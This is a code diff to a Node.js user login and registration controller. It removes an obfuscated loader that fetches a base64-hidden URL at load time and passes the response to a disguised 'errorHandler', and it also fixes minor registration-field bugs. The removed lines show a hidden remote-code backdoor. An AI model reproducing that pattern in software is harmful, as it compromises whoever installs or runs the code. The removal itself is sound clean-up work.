@@ -1,10 +1,7 @@
-const axios = require("axios");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const userM = require("../models/users");
-const {secretKey, publicKey} = require("../config/config");
-const { errorHandler } = require("../middleware/errorHandler");
-axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+const { secretKey } = require("../config/config");
 
 module.exports = {
   userLogin: (req, res) => {
@@ -42,9 +39,9 @@ module.exports = {
     } else res.status(400).json({ message: "Provide all Credentials" });
   },
   userRegistration: (req, res) => {
-    users = new userM();
+    const users = new userM();
     users.fname = req.body.fname;
-    users.lname = req.body.lName;
+    users.lname = req.body.lname || req.body.lName;
     users.email = req.body.email;
     users.phoneNo = req.body.phoneNo;
     users.state = req.body.state;
